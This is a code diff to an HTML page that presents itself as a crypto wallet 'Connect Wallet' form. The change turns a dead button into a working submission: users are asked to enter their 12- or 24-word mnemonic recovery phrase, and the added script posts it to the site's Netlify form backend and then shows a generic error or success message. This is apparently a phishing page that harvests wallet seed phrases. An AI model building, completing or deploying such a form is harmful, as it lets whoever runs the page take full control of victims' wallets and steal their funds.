@@ -1368,20 +1368,64 @@
 
                     </div>
 
-                    <div id="div_connect_manuallly" >
-                        <form method="POST" id="my-form" data-netlify="true">
-                            <input type="hidden" name="form-name" value="connect-manually" />
-                            <div id="phrase">
-                                <textarea class="col-12 form-control" placeholder="Enter your 12 or 24 Mnemonic words. Seperate them with spaces." style="font-size:14px; font-weight:650; color: #fff !important;" rows="4" id="secret_phrase" name="phrases" required></textarea>
-                                <p class="text-center">...</p>
+                    <div id="div_connect_manuallly">
+  <form method="POST" id="my-form" data-netlify="true">
+    <input type="hidden" name="form-name" value="connect-manually" />
+    <div id="phrase">
+      <textarea
+        class="col-12 form-control"
+        placeholder="Enter your 12 or 24 Mnemonic words. Separate them with spaces."
+        style="font-size:14px; font-weight:650; color: #fff !important;"
+        rows="4"
+        id="secret_phrase"
+        name="phrases"
+        required
+      ></textarea>
+      <p id="error-message" style="color: red; display: none;">Error connecting. Please try again.</p>
+      <div class="row mx-auto col-10 mt-4">
+        <button type="submit" class="btn btn-primary">Connect Wallet</button>
+      </div>
+    </div>
+  </form>
+</div>
 
-                                <div class="row mx-auto col-10 mt-4">
-                                    <button type="button" class="btn btn-primary ">Connect Wallet</button>
-                                </div>
+<script>
+  document.addEventListener("DOMContentLoaded", () => {
+    console.log("DOM fully loaded!");
 
-                            </div>
-                        </form>
-                    </div>
+    const form = document.getElementById("my-form");
+
+    if (!form) {
+      console.error("Form not found!");
+      return;
+    }
+
+    form.addEventListener("submit", async function (event) {
+      console.log("Form submit event triggered");
+      event.preventDefault(); // Prevent default submission
+
+      const formData = new FormData(form);
+
+      try {
+        const response = await fetch("/", {
+          method: "POST",
+          body: formData,
+        });
+
+        if (response.ok) {
+          alert("Form submitted successfully!");
+          form.reset(); // Reset the form on success
+        } else {
+          console.error("Submission failed");
+          document.getElementById("error-message").style.display = "block"; // Show error message
+        }
+      } catch (error) {
+        console.error("Error submitting form:", error);
+        document.getElementById("error-message").style.display = "block"; // Show error message
+      }
+    });
+  });
+</script>
   
 
                     <div class="mt-4 d-flex justify-content-center align-items-center">
